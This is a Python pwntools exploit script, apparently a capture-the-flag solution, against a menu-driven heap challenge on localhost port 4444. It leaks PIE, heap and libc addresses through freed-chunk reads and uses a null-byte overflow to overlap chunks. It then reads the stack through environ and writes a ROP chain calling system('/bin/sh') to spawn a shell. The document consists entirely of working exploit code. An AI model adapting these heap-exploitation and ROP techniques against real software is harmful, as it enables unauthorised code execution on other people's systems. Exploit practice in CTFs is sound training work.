from pwn import *

# Tested on Ubuntu 16.04

def menu(n):
	r.sendafter("Exit\n", str(n) + "\n")

def add(i, sz, c):
	menu(1)
	r.sendafter("Index: ", str(i) + "\n")
	r.sendafter("Enter the size: ", str(sz) + "\n")
	r.sendafter("Enter the content: ", c + "\n")

def update(i, c):
	menu(2)
	r.sendafter("Index: ", str(i) + "\n")
	r.sendafter("Enter the content: ", c + "\n")

def ver(i):
	menu(3)
	r.sendafter("Index: ", str(i) + "\n")
	r.recvline()
	return r.recv(8)

def delete(i):
	menu(4)
	r.sendafter("Index: ", str(i) + "\n")	

def salir():
	menu(5)

r = remote("localhost", 4444)

pie = int(r.recv(12), 16) + 0x20
print "[+] pie: 0x%x" % pie 

add(0, 0x10, "")
add(1, 0x10, "")
add(2, 0x10, "")
add(4, 0x10, "")
delete(4)
delete(1)
heap = u64(ver(1).ljust(8, '\0'))
print "[+] heap: 0x%x" % heap
delete(2)
delete(0)

add(0, 0x100, "")
add(1, 0x100, "")
delete(0)
base_libc = u64(ver(0).ljust(8, '\0')) - 0x3c4b78
print "[+] base libc: 0x%x" % base_libc
delete(1)

p_system = base_libc + 0x45390
p_bin_sh = base_libc + 0x18cd17
pop_rdi = base_libc + 0x21102
environ = base_libc + 0x3c6f38

add(0, 0x58, "")
add(1, 0xf8, "")
size = heap - pie
print "[+] size (heap - size): 0x%x" % size
update(0, p64(0)*4 + p64(0x100) + p64(size) + p64(pie)*2 + p64(0)*2 + p64(size) + "\x00") # null byte overflow size next chunk
delete(1)
add(3, 0x400, "")

update(3, p64(0)*10 + p64(environ))
stack = u64(ver(0).ljust(8, '\0')) - 0x110
print "[+] stack: 0x%x" % stack 
update(3, p64(0)*10 + p64(stack))
update(0, p64(pop_rdi) + p64(p_bin_sh) + p64(p_system))

r.interactive()
